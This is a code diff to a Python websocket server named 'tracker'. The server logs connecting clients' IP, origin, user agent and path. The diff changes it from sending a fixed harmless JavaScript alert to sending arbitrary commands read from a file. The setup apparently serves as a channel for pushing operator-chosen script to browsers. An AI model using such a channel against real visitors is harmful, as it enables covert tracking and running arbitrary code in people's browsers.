@@ -23,10 +23,9 @@ async def tracker(websocket, path):
         print("---END CONNECTION---")
         data = "Host: "+ip+"\tOrigin: "+websocket.request_headers.get('origin')+"\tUser-Agent: "+websocket.request_headers.get('user-agent')+"\tPath: "+path
         logging.info(data)
-        instruction = """
-alert('Hello, friend.');
-document.body.innerHTML = document.body.innerHTML + "This page just got updated.";
-"""
+        insData = open('command.txt','r')
+        instruction = insData.read()
+        insData.close()
         await websocket.send(instruction)
         break
 asyncio.get_event_loop().run_until_complete(websockets.serve(tracker, '0.0.0.0', 8080))
